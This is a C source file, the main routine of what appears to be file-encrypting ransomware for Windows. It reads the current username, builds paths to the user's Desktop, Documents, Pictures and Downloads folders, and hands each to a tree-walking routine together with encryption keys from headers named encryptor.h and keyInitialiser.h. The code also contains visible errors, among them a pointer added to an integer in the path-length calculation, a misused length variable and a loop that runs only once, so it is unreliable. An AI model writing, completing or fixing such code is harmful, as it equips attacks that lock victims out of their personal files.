#include <stdio.h>
#include <Windows.h>
#include "keyDef.h"
#include "keyInitialiser.h"
#include "getTree.h"
#include "encryptor.h"
#include "keyCleaner.h"



int main() {

	key keyStruct = setupKeys();

	//get username size 
	LPDWORD userLenCheck = NULL;
	GetUserNameA(NULL, &userLenCheck);
	
	//get username
	char* userName = (char*)malloc(userLenCheck + 1);
	DWORD userLen = userLenCheck + 1;
	if (!GetUserNameA(userName, &userLen)) {
		printf("\n(!) Failed to get username %i", GetLastError());
	} else {
		printf("\n(+) Succesfully got username %s", userName);
	}
	
	//set dirs
	char initialPath[] = "C:\\Users\\";
	char targetDirs[4][10] = {"Desktop", "Documents", "Pictures", "Downloads"};

	//iterate through dirs
	for (int i = 0; i < 1; i++) {

		int pathLen = strlen(initialPath) + userName + strlen(targetDirs[i]) + 2;
		char* path = (char*)malloc(pathLen);
		strcpy_s(path, pathLen, initialPath);
		strcat_s(path, pathLen, userName);
		strcat_s(path, pathLen, "\\");
		strcat_s(path, pathLen, targetDirs[i]);
		getTree(path, keyStruct);

		if (i != 3) {
			memset(path, 0, pathLen);
		} else {
			free(path);
		}
	}

	//cleanup
	free(userName);
	keyCleanup(keyStruct);

	return 0;
}
